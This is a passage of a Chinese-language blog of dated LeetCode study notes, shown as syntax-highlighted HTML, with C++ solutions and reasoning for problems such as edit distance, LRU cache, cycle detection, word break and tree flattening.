punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// word2[j - 1] （下标0开始），那么可以直接参考 dp[i - 1][j - 1]</span>                <span class="token comment">// ，操作不用加一</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span>                    <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">// 放在上句的后面是因为当两个单词当前字母相等时，放在后面才能确保dp[i][j]的正确性</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>word1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> word2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 最后一个行中的最后一个元素。</span>        <span class="token keyword">return</span> dp<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="乘积最大子数组">2023-10-29-<ahref="https://leetcode.cn/problems/maximum-product-subarray/description/">乘积最大子数组</a></h3><h4 id="我思-9">我思</h4><ol type="1"><li>正数越多越好</li><li>有负数，偶数个负数</li><li>确定子序列起点；确定子序列长度</li></ol><h4 id="实现-9">实现</h4><ol type="1"><li><p>由于正负性：当前位置的最优解未必是由前一个位置的最优解转移得到的。</p><ol type="1"><li>如果当前位置是负数，那么最好前面负的越多越好</li><li>如果是正数，那么正的越多越好</li></ol></li><li><p>并不需要dp数组，只需要前一个位置的最大解或者最小解</p></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">maxProduct</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> maxF <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> minF <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ans <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> mx <span class="token operator">=</span> maxF<span class="token punctuation">,</span> mn <span class="token operator">=</span> minF<span class="token punctuation">;</span>            <span class="token comment">// 要获得乘积最大，比较四个情况:nums[i];nums[i]*mx;nums[i]*mn;前一个位置的最大乘积</span>            maxF <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> mx<span class="token punctuation">,</span> <span class="token function">max</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> mn<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            minF <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> mx<span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> mn<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 第四个情况的比较</span>            ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxF<span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="lru-缓存">2023-10-25 <ahref="https://leetcode.cn/problems/lru-cache/description/">146.LRU缓存</a></h3><h4 id="我思-10">我思</h4><ol type="1"><li>关键是：对下一个被替换的键值对标记，方便随时替换</li></ol><h4 id="实现-10">实现</h4><ol type="1"><li><p>从函数功能出发,更多的是数据结构的考量：</p><ol type="1"><li><code>int get(int key)</code>需要通过数字，找到这个页面，(key,value)-》map数据结构，</li><li>数组还是链表？<ol type="1"><li><code>void put(int key, int value)</code>主要是考虑置换哪个页面：<ol type="1"><li>如果是数组，则需要不断更新每个页面的标记（标记表示置换的优先级）</li><li>如果是链表：按从头到尾表示优先级即可（头插法），头部插入</li></ol></li></ol></li></ol></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 为什么是双向链表（我认为数组也可以）</span><span class="token comment">// 但如果是链表，则双向可以更快确定插入位置/删除位置的前后节点</span><span class="token keyword">struct</span> <span class="token class-name">DLinkedNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> key<span class="token punctuation">,</span> value<span class="token punctuation">;</span>    DLinkedNode<span class="token operator">*</span> prev<span class="token punctuation">;</span>    DLinkedNode<span class="token operator">*</span> next<span class="token punctuation">;</span>    <span class="token function">DLinkedNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">key</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">prev</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">DLinkedNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> _key<span class="token punctuation">,</span> <span class="token keyword">int</span> _value<span class="token punctuation">)</span>        <span class="token operator">:</span> <span class="token function">key</span><span class="token punctuation">(</span>_key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">value</span><span class="token punctuation">(</span>_value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">prev</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LRUCache</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span><span class="token operator">:</span>    unordered_map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> DLinkedNode<span class="token operator">*</span><span class="token operator">></span> cache<span class="token punctuation">;</span>    DLinkedNode<span class="token operator">*</span> head<span class="token punctuation">;</span>    <span class="token comment">// 移除尾部节点（被置换的节点）</span>    DLinkedNode<span class="token operator">*</span> tail<span class="token punctuation">;</span>    <span class="token comment">// 比较size和capacity确定是否需要置换</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">int</span> capacity<span class="token punctuation">;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token function">LRUCache</span><span class="token punctuation">(</span><span class="token keyword">int</span> _capacity<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">capacity</span><span class="token punctuation">(</span>_capacity<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">DLinkedNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tail <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">DLinkedNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token operator">-></span>next <span class="token operator">=</span> tail<span class="token punctuation">;</span>        tail<span class="token operator">-></span>prev <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cache<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        DLinkedNode<span class="token operator">*</span> node <span class="token operator">=</span> cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 刷到最新</span>        <span class="token function">moveToHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> node<span class="token operator">-></span>value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">int</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cache<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            DLinkedNode<span class="token operator">*</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">DLinkedNode</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>            <span class="token comment">// 刷新</span>            <span class="token function">addToHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">++</span>size<span class="token punctuation">;</span>            <span class="token comment">// 超出容量</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">></span> capacity<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                DLinkedNode<span class="token operator">*</span> removed <span class="token operator">=</span> <span class="token function">removeTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cache<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>removed<span class="token operator">-></span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">delete</span> removed<span class="token punctuation">;</span>                <span class="token operator">--</span>size<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            DLinkedNode<span class="token operator">*</span> node <span class="token operator">=</span> cache<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>            node<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>            <span class="token function">moveToHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">addToHead</span><span class="token punctuation">(</span>DLinkedNode<span class="token operator">*</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        node<span class="token operator">-></span>prev <span class="token operator">=</span> head<span class="token punctuation">;</span>        node<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>        head<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>        node<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">removeNode</span><span class="token punctuation">(</span>DLinkedNode<span class="token operator">*</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        node<span class="token operator">-></span>prev<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>        node<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> node<span class="token operator">-></span>prev<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">moveToHead</span><span class="token punctuation">(</span>DLinkedNode<span class="token operator">*</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">removeNode</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">addToHead</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    DLinkedNode<span class="token operator">*</span> <span class="token function">removeTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        DLinkedNode<span class="token operator">*</span> node <span class="token operator">=</span> tail<span class="token operator">-></span>prev<span class="token punctuation">;</span>        <span class="token function">removeNode</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> node<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="环形链表-ii">2023-10-24 <ahref="https://leetcode.cn/problems/linked-list-cycle-ii/description/">142.环形链表II</a></h3><h4 id="我思-11">我思</h4><ol type="1"><li>快慢指针法</li></ol><h4 id="实现-11">实现</h4><ol type="1"><li><p><strong>法1</strong>：哈希表法，找到同一节点即为环的入口</p></li><li><p><strong>法2</strong>：快慢指针法</p><ol type="1"><li>快指针能追上慢指针，仅能说明有环</li><li>而本题我们是要找出环的起点</li></ol></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    ListNode<span class="token operator">*</span> <span class="token function">detectCycle</span><span class="token punctuation">(</span>ListNode<span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 从头节点出发：</span>        <span class="token comment">// 快指针走2步，慢指针走一步。</span>        <span class="token comment">// 重合需要满足的要求：快指针追上慢指针（在环内），快指针刚好超过慢指针n圈环</span>        ListNode<span class="token operator">*</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>        ListNode<span class="token operator">*</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fast <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>fast<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>            slow <span class="token operator">=</span> slow<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fast <span class="token operator">==</span> slow<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// f（快指针步数）；s(慢指针步数)；b(环的步数)</span>                <span class="token comment">// 在第一次相遇时满足：</span>                <span class="token comment">// 1. f = 2s; (2倍速度)</span>                <span class="token comment">// 2. f = s+nb</span>                <span class="token comment">// 由以上两式知s=nb</span>                <span class="token comment">// 画个示意图：假设快慢指针在环内的同一点即s+(n-1)b处，则再次相遇快指针要超过慢指针一圈</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// a(链表头结点到环起点的步数)；x（从环起点到当前位置的步数）;k&lt;n(绕环的圈数)</span>        <span class="token comment">// 1. s = nb</span>        <span class="token comment">// 2. s = （n-1）b+a+x</span>        <span class="token comment">// 因此慢指针在此时的位置（第一次相遇）再走a步必定在环的起始处，</span>        <span class="token comment">// 如何确定走a步：让另一指针在头节点出发，该指针与慢指针相遇则确定是走了a步</span>        fast <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> fast<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token punctuation">;</span>            slow <span class="token operator">=</span> slow<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> slow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="单词拆分">2023-10-11 <ahref="https://leetcode.cn/problems/word-break/description/">139.单词拆分</a></h3><h4 id="我思-12">我思</h4><ol type="1"><li>首字母一样</li><li>对每个单词进行字符匹配</li></ol><h4 id="实现-12">实现</h4><ol type="1"><li><p>一个字符串切分单词的点：j</p></li><li><p>确定这是否是个字符串：哈希表</p></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">wordBreak</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> wordDict<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 哈希表 方便查找单词是否存在</span>        unordered_set<span class="token operator">&lt;</span>string<span class="token operator">></span> wordDictSet<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>string s <span class="token operator">:</span> wordDict<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            wordDictSet<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">dp</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// dp[i] 表示前i个字符能被拆分成现有的单词</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 单词划分点</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>                    wordDictSet<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> wordDictSet<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="最长连续序列">2023-10-10 <ahref="https://leetcode.cn/problems/longest-consecutive-sequence/description/">128.最长连续序列</a></h3><h4 id="我思-13">我思</h4><ol type="1"><li>排序，但不满足O(n)</li><li>放在一个数组里，例如：100就放在a[100]，再次遍历找到最长连续序列</li></ol><h4 id="实现-13">实现</h4><ol type="1"><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">longestConsecutive</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 哈希表</span>        unordered_set<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums_set<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            nums_set<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> longestSequence <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nums_set<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 确定当前数字为序列的最佳start</span>                <span class="token keyword">int</span> currentNum <span class="token operator">=</span> num<span class="token punctuation">;</span>                <span class="token keyword">int</span> currentLength <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// 1而不是0</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>nums_set<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>currentNum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 为什么时间复杂度一定为O(n),因为两层循环之和才为n</span>                    currentNum<span class="token operator">++</span><span class="token punctuation">;</span>                    currentLength<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                longestSequence <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>longestSequence<span class="token punctuation">,</span> currentLength<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> longestSequence<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="二叉树展开为链表">2023-10-03 <ahref="https://leetcode.cn/problems/flatten-binary-tree-to-linked-list/description/">114.二叉树展开为链表</a></h3><h4 id="我思-14">我思</h4><ol type="1"><li>递归</li><li>构建链表</li><li>判断是否为空</li></ol><h4 id="实现-14">实现</h4><ol type="1"><li><p>法1：前序遍历，存入vector，创建链表</p></li><li><p>法2：<code>空间复杂度</code>O(1)。Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">void</span> <span class="token function">flatten</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 寻找前驱节点</span>        TreeNode<span class="token operator">*</span> cur <span class="token operator">=</span> root<span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token operator">-></span>left<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                TreeNode<span class="token operator">*</span> curLeft  <span class="token operator">=</span> cur<span class="token operator">-></span>left<span class="token punctuation">;</span>                TreeNode<span class="token operator">*</span> pre <span class="token operator">=</span> curLeft<span class="token punctuation">;</span>  <span class="token comment">// 左子树的最右节点</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>pre<span class="token operator">-></span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    pre <span class="token operator">=</span> pre<span class="token operator">-></span>right<span class="token 